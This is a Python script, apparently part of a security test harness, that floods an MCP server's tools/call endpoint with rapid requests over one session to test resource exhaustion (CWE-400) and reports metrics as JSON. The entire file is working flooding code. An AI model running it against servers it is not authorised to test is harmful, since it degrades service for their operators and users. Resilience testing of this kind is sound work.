"""
Vector 5 -- Tool-invocation flooding (CWE-400), Streamable HTTP transport,
TypeScript reference server.

Establishes ONE session (one realistic "authenticated" client) then fires
`rate_per_s * duration_s` sequential tools/call requests at it as fast as
the connection allows -- a burst of legitimate-looking but excessive
calls, which is the realistic shape of this vector (a flood doesn't need
concurrent connections, just an excessive rate on one).

Usage: python attack.py <base_url> <rate_per_s> <duration_s> [timeout_s]
"""
from __future__ import annotations

import json
import sys
import time

import httpx


def initialize(client: httpx.Client, base_url: str) -> str | None:
    body = {
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                   "clientInfo": {"name": "flood-attacker", "version": "1.0"}},
    }
    r = client.post(f"{base_url}/mcp", json=body,
                     headers={"Accept": "application/json, text/event-stream"})
    sid = r.headers.get("mcp-session-id")
    if sid:
        client.post(f"{base_url}/mcp",
                     json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                     headers={"mcp-session-id": sid, "Accept": "application/json, text/event-stream"})
    return sid


def main():
    base_url = sys.argv[1]
    rate_per_s = float(sys.argv[2])
    duration_s = float(sys.argv[3])
    timeout_s = float(sys.argv[4]) if len(sys.argv) > 4 else 5.0
    total = max(1, int(rate_per_s * duration_s))

    with httpx.Client(timeout=timeout_s) as client:
        sid = initialize(client, base_url)
        if not sid:
            print(json.dumps({"sent_bytes": 0, "ok": 0, "failed": total, "elapsed_s": 0.0,
                               "error": "could not initialize session"}))
            return

        headers = {"mcp-session-id": sid, "Accept": "application/json, text/event-stream",
                   "Content-Type": "application/json"}
        body_bytes_each = len(json.dumps({
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": "echo", "arguments": {"text": "flood"}},
        }).encode())

        ok = 0
        failed = 0
        t0 = time.perf_counter()
        for i in range(total):
            try:
                r = client.post(f"{base_url}/mcp",
                                 json={"jsonrpc": "2.0", "id": 2 + i, "method": "tools/call",
                                       "params": {"name": "echo", "arguments": {"text": "flood"}}},
                                 headers=headers)
                if r.status_code == 200:
                    ok += 1
                else:
                    failed += 1
            except httpx.HTTPError:
                failed += 1
        elapsed = time.perf_counter() - t0

    print(json.dumps({"sent_bytes": body_bytes_each * total, "ok": ok, "failed": failed,
                       "elapsed_s": elapsed, "attempted": total}))


if __name__ == "__main__":
    main()
